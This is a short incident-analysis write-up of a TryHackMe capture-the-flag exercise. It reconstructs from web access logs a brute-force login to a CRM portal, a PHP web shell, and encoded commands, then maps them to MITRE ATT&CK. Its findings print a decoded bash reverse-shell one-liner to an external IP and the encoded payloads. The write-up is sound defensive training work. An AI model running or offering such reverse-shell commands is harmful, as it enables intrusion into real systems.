This investigation is based on the **Portal Drop** CTF from **First Shift** on **TryHackMe**.
- Summary
- Observation 
- Findings
- Timeline 
- MITRE ATT&CK mapping

## Summary

While going through the access logs, I noticed repeated failed login attempts coming from the same IP. That immediately made me suspect a brute-force attack, so I started following that IP throughout the logs.

## Observation 

#### Time - 14:16:14

Multiple `POST` requests to `/CRM/login.php` resulting in `HTTP 401 were observed from `34.67.91.83`.

I suspected possible bruteforce


Evidence

- Source IP: 34.67.91.83
- Endpoint: /CRM/login.php 
- Response: HTTP 401 
- User-Agent: PF-Scanner/1.0

![bruteforce](First shit/screenshots/brute.png)

#### Time - 14:20:54

A successful authentication was observed from the same IP (`34.67.91.83`), followed by `HTTP 200 OK` responses for authenticated resources.

![bruteforce](/screenshots/successful.png)

#### Time - 14:27:34

The attacker accessed `invoice.php` in the `/CRM/portal/uploads/` directory and supplied a double Base64-encoded command through the `q` parameter (`ZDJodllXMXA`).

#### Time - 14:28:34

A second request to `invoice.php` contained another double Base64-encoded payload in the `q` parameter (`WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1UVXVOVGd1TVRRNExqZzJMemd3T0RBZ01ENG1NUT09`).

![bruteforce](screenshot/encodedcommands.png)

## Findings

- Bruteforce
- logged in succesfully
- IP - 34.67.91.83
- attacker used double encoded commands
- ZDJodllXMXA - whoami
- WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1UVXVOVGd1TVRRNExqZzJMemd3T0RBZ01ENG1NUT09 - bash -i >& /dev/tcp/115.58.148.86/8080 0>&1
  

## Timeline
| Time     | action                           |
| -------- | -------------------------------- |
| 14:16:14 | Brute-force login attempts begin |
| 14:20:54 | Successful authentication        |
| 14:21    | CRM portal accessed              |
| 14:27:32 | Upload endpoint accessed         |
| 14:27:34 | Web shell executed (`whoami`)    |
| 14:28:34 | Reverse shell attempt            |



## MITRE ATT&CK MAPPING

| Tactic              | Technique                                   | ID        |
| ------------------- | ------------------------------------------- | --------- |
| Credential Access   | Brute Force                                 | T1110     |
| Persistence         | Web Shell                                   | T1505.003 |
| Execution           | Unix Shell                                  | T1059.004 |
| Defense Evasion     | Obfuscated/Compressed Files and Information | T1027     |
| Command and Control | Non-Application Layer Protocol              | T1095     |

![bruteforce](screenshot/attackerlogs.png)

## Conclusion
The investigation identified a brute-force attack that resulted in successful authentication, deployment of a PHP web shell, execution of encoded commands, and an attempted reverse shell. The attack sequence was reconstructed using HTTP access logs and decoded payloads.
